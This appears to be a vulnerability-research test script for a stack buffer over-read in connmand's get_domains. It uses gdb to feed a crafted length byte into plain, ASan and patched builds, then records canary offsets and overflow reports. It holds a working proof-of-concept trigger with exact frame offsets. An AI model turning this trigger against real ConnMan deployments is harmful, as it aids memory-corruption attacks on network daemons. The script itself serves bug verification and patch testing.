#!/bin/bash
# CVE-2026-115863 — canary-boundary measurement in the real pinned objects.
#
# Bounded complement to probe.sh: the production -O2 connmand puts its stack
# canary at dns_name+1032 and glibc gives that canary a zero low byte.  A walk
# whose first out-of-bounds step lands exactly there (K=7) *reads* the zero
# byte and stops; a larger K steps over the canary.  This script records both
# sides.  It is a debugger-forced call, not a daemon run and not rung 5.
set -u
cd "$(dirname "$0")"
E=evidence
mkdir -p "$E"
PASS=0
FAIL=0
ok() { PASS=$((PASS + 1)); printf 'PASS %s\n' "$1"; }
no() { FAIL=$((FAIL + 1)); printf 'FAIL %s\n' "$1"; }
has() { grep -qF "$2" "$1" 2>/dev/null && ok "$3" || no "$3"; }
hasnt() { grep -qF "$2" "$1" 2>/dev/null && no "$3" || ok "$3"; }

for v in plain asan fixed; do
  test -x "build-$v/src/connmand" || exit 90
  printf 'BIN %s sha256=%s\n' "$v" \
    "$(sha256sum "build-$v/src/connmand" | cut -d' ' -f1)"
done

gdb_attack() {
  v=$1 k=$2 out=$3
  cat > "$E/canary-$v-$k.gdb" <<EOF
set pagination off
set confirm off
break main
run --help
set \$buf = (char *) malloc(2048)
call (void*) memset(\$buf, 255, 2048)
set \$buf[1024] = $k
printf "CANARY_LOW=%02x\n", *(unsigned char*)(\$fs_base + 0x28)
call (void*) get_domains(2048, \$buf)
printf "CALL_RETURNED\n"
quit
EOF
  ASAN_OPTIONS=detect_leaks=0 gdb -q -batch -x "$E/canary-$v-$k.gdb" \
    "build-$v/src/connmand" >"$out" 2>&1
  printf 'PROBE %-5s K=%-3s lines=%s\n' "$v" "$k" "$(wc -l <"$out")"
}

# K=7: first OOB step = dns_name+1032, the production canary slot.
gdb_attack asan 7 "$E/canary-asan-k7.out"
gdb_attack asan 128 "$E/canary-asan-k128.out"
gdb_attack plain 7 "$E/canary-plain-k7.out"
gdb_attack fixed 7 "$E/canary-fixed-k7.out"

# ASan geometry: K=7 reads frame offset 1080 = dns_name(48)+1032; K=128
# steps over that slot to offset 1201, the same delta as every other harness.
has "$E/canary-asan-k7.out" 'stack-buffer-overflow' 'asan-k7-report'
has "$E/canary-asan-k7.out" 'READ of size 1' 'asan-k7-read1'
has "$E/canary-asan-k7.out" 'offset 1080' 'asan-k7-canary-slot'
has "$E/canary-asan-k128.out" 'offset 1201' 'asan-k128-past-canary'

# Production object: the canary's low byte is zero, the injected call returns
# without __stack_chk_fail, so the K=7 walk stops at the zero byte it reads.
has "$E/canary-plain-k7.out" 'CANARY_LOW=00' 'plain-canary-low-zero'
has "$E/canary-plain-k7.out" 'CALL_RETURNED' 'plain-k7-returned'
hasnt "$E/canary-plain-k7.out" 'stack smashing' 'plain-k7-no-smash'

# Mandatory fixed control on the same K.
hasnt "$E/canary-fixed-k7.out" 'AddressSanitizer' 'fixed-k7-clean'
has "$E/canary-fixed-k7.out" 'CALL_RETURNED' 'fixed-k7-returned'

printf 'CANARY TOTAL %d PASS / %d FAIL\n' "$PASS" "$FAIL"
[ "$FAIL" -eq 0 ]
